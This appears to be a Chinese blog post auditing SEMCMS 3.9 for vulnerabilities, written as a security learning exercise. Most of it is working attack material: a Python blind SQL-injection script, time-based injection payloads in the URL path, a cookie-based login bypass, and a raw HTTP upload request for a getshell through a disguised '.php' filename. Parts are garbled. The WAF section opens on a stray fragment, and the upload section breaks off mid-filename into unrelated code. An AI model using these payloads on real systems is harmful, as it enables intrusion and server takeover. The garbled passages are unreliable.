### 前言
起源于社团大佬发出的一张图片，最近没事就练一下代码审计吧。。。然后电脑坏了，借了一台win11的，凑合着用吧。
### SQL注入
这个CMS的SQL注入挺多的，我就写一下前台利用吧。
#### 第一处
我们直接看一下他写的waf
    110
或者是
    languageID = 2 and ascii(substr(database(),1,1))^109
附一份脚本：
    import requests
    url = "http://localhost"
    database=""
    for i in range(1,6):
        for j in range(97,127):
            payload = "1 and ascii(substr(database(),{i},1))^{j}".format(j=j,i=i)
            data = {"languageID":payload}
            #print(payload)
            c=requests.post(url=url,data=data).text
            if "Empty!" in c:
                database+=chr(j)
    print(database)
#### 第二处
    $web_urls=$_SERVER["REQUEST_URI"];  //获取 url 路径
    $web_urls=explode("/", $web_urls);
    $urlml=web_language_ml(@$web_urls[1],@$web_urls[2],$db_conn);  // 大写的问号。
跟进`web_language_ml`方法：
    function web_language_ml($web_urls1,$web_urls2,$db_conn){
      $query=$db_conn->query("select * from sc_language where language_url='$web_urls1' or  language_url='$web_urls2' and  language_open=1");
          if (mysqli_num_rows($query)>0){
              $query=$db_conn->query("select * from sc_language where language_url='$web_urls1' or  language_url='$web_urls2' and  language_open=1");
              $row=mysqli_fetch_assoc($query);
              $Urlink=array('url_link'=>$row['language_url'],'url_ml'=>"../",'ID'=>$row['ID']);
          }else{
             $query=$db_conn->query("select * from sc_language where language_mulu=1 and  language_open=1");
             $row=mysqli_fetch_assoc($query);
             $Urlink=array('url_link'=>"",'url_ml'=>"./",'ID'=>$row['ID']);
          }
        return $Urlink; 
    }
可以看到`$web_urls`会被放入数据库语句执行，由于﻿`$web_urls`获取没有经过过滤函数，所以可以确定存在SQL注入。  
但是某些特殊字符在GET传参时，被url编码了，比如双引号，大于号小于号，不过这个地方单引号没有被过滤，可以闭合；而且空格也会被处理，`%0a%ob`也会被认为字符串，`/**/`的方法也不行。
我们可以尝试这样构造：
    /index.php/'or(sleep(3))or'
完整SQL语句：
    /index.php/1’or+if(substr((select+min(table_name)from(information_schema.tables)where+table_schema=(database())&&table_name!=’sc_banner’),1,1)>’a’,sleep(15),1)#
### SQL注入绕过登录
    function checkuser($db_conn){ //判断用户是否登陆
        $cookieuseradmin=@verify_str(test_input($_COOKIE["scuseradmin"]));
        $cookieuserpass=@verify_str(test_input($_COOKIE["scuserpass"]));
        $query=$db_conn->query("select * from sc_user where user_admin='$cookieuseradmin' and user_ps='$cookieuserpass'");
        if (mysqli_num_rows($query)>0){
             $row=mysqli_fetch_assoc($query);
             return $row['user_qx'];
         }else{
            echo "";
            exit; 
        }
    }
获取Cookie中的用户名密码构成sql语句，以单引号格式进行拼接，我们可以恶意构造
    select * from sc_user where user_admin='111\' and user_ps='or 1#'
此时，原语句中的SQL单引号被转义，同时编辑cookie`scuseradmin`和`scuserpass`的值
### 后台文件上传+Getshell
制作一份php内容的图片
在后台管理页面添加此照片
BurpSuite拦截进行修改
    POST /SEMCMS3.9/OSWttq_Admin/SEMCMS_Upfile.php HTTP/1.1
    Host: localhost
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------3369516516527364944820946580
    Content-Length: 830
    Origin: http://localhost
    Connection: close
    Referer: http://localhost/SEMCMS3.9/OSWttq_Admin/SEMCMS_Upload.php?Imageurl=../Images/prdoucts/&filed=images_url&filedname=forms
    Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    -----------------------------3369516516527364944820946580
    Content-Disposition: form-data; name="wname"
    111
    -----------------------------3369516516527364944820946580
    Content-Disposition: form-data; name="file"; filename="test.jpg"
    Content-Type: image/jpeg
    -----------------------------3369516516527364944820946580
    Content-Disposition: form-data; name="imageurl"
    ../Images/prdoucts/
    -----------------------------3369516516527364944820946580
    Content-Disposition: form-data; name="filed"
    images_url
    -----------------------------3369516516527364944820946580
    Content-Disposition: form-data; name="filedname"
    forms
    -----------------------------3369516516527364944820946580
    Content-Disposition: form-data; name="submit"
    Submit
    -----------------------------3369516516527364944820946580--    
在我们重命名的时候修改重命名文件为`111.jpg.php:`进行保存，这是我们看后台保存图片已经写入，但是没有数据。
第二次提交，提交同样的图片，这一次我们修改上传文件名为`test.jpg', $mb, $template_o);
                  $output = str_replace('', $dirpaths, $output);
              file_put_contents($templateUrl, $output);
               }
    }
这个地方的`$mb`是可控的
这里`file_get_contents()` 和 `str_replace()`
就是从模板目录下提取index.php和.htaccess文件然后替换``写入到主目录下
理论上这个地方也可以Getshell，但这个地方我还是不太明白到底`test.jpg<<<`是如何写入的，希望有大佬能教教我~